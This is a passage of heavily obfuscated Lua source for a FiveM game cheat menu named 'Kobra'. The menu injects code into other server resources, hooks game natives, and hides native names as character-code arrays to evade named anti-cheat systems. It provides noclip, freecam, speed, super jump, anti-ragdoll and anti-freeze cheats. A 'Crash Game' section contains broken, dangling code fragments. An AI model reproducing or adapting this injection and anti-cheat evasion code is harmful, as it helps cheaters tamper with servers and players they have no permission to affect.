                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v354   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                            end
                                        ]] );else MachoInjectResource2(7 -4 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v354   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=1710.25 -(1596 + 114) ,step=0.25 -0 ,min=713.25 -(164 + 549) ,max=1443 -(1059 + 379) ,onSelect=function(v356,v357) v275:ToggleFreecam(v357,v356);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v358) if v358 then local v606=0;while true do if (v606==(0 + 0)) then v12:Notify("success","Kobra","Fast Run On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v607=0;while true do if (v607==(0 + 0)) then v12:Notify("error","Kobra","Fast Run Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v359) local v360=392 -(145 + 247) ;local v361;local v362;local v363;local v364;local v365;while true do if (v360==2) then function v363(v767) return _G[v362(v767)];end v364=nil;v360=3 + 0 ;end if (v360==(2 + 2)) then function v365() local v768=0 -0 ;while true do if (v768==0) then _G.superJumpEnabled=false;v363({72 + 11 ,163 -62 ,676 -(544 + 16) ,711 -(294 + 334) ,51 + 66 ,421 -309 ,53 + 48 ,114,868 -(413 + 381) ,248 -131 ,2079 -(582 + 1388) ,81 + 31 ,248 -164 ,724 -(47 + 573) ,105,488 -373 ,1734 -(1269 + 395) ,557 -(319 + 124) ,97,1116 -(564 + 443) ,101})(v363({80,108,97,121,101,181 -67 ,73,244 -(102 + 42) })(),1);break;end end end if v359 then if v361 then v364();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v361 then print("off");v365();else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end if ((1845 -(1524 + 320))==v360) then function v362(v769) local v770=0;local v771;while true do if (v770==(1271 -(1049 + 221))) then return v771;end if (v770==(156 -(18 + 138))) then v771="";for v1111=2 -1 , #v769 do v771=v771   .. string.char(v769[v1111]) ;end v770=1;end end end v363=nil;v360=1104 -(67 + 1035) ;end if (v360==(351 -(136 + 212))) then function v364() if  not _G.superJumpEnabled then _G.superJumpEnabled=true;v363({284 -217 ,106 + 8 ,1183 -(1050 + 32) ,58 + 39 ,116,101,7 + 77 ,829 -(267 + 458) ,218 -104 ,1598 -(1410 + 87) ,262 -165 ,896 -(461 + 335) })(function() while _G.superJumpEnabled do v363({83,1862 -(1730 + 31) ,116,293 -210 ,268 -151 ,1180 -(138 + 930) ,93 + 8 ,98 + 16 ,74,1987 -(474 + 1396) ,189 -80 ,105 + 7 ,84,297 -193 ,105,115,661 -(562 + 29) ,98 + 16 ,77 + 20 ,109,33 + 68 })(v363({53 + 27 ,108,1591 -(1307 + 187) ,479 -358 ,236 -135 ,114,73,100})());Wait(0);end end);end end v365=nil;v360=4 + 0 ;end if (v360==(0 + 0)) then v361=GetResourceState("WaveShield")=="started" ;v362=nil;v360=565 -(510 + 54) ;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v366=0;local v367;while true do if (v366==0) then v367=nil;function v367() local v772=SetEntityHealth;v772(PlayerPedId(),0 -0 );end v366=1 -0 ;end if (v366==(1089 -(830 + 258))) then v367();break;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1 + 0 ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v368) if (v368=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v368=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v369) local v370=0 + 0 ;local v371;local v372;while true do if (v370==1) then if v369 then if v371 then v12:Notify("success","Kobra","No Ragdoll Enabled",3241 -(237 + 4) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);else local v1029=0;while true do if (v1029==(0 -0)) then v48(v372,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",7590 -4590 );break;end end end elseif v371 then local v1030=0 -0 ;while true do if (v1030==0) then v12:Notify("success","Kobra","No Ragdoll Disabled",2456 + 544 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);break;end end else v48(v372,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",3000);end break;end if (v370==0) then v371=GetResourceState("WaveShield")=="started" ;v372=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v370=1 + 0 ;end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v373) local v374=GetResourceState("WaveShield")=="started" ;local v375=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v373 then if v374 then local v773=0;while true do if (v773==(0 -0)) then v12:Notify("success","Kobra","Anti-Freeze Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v48(v375,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
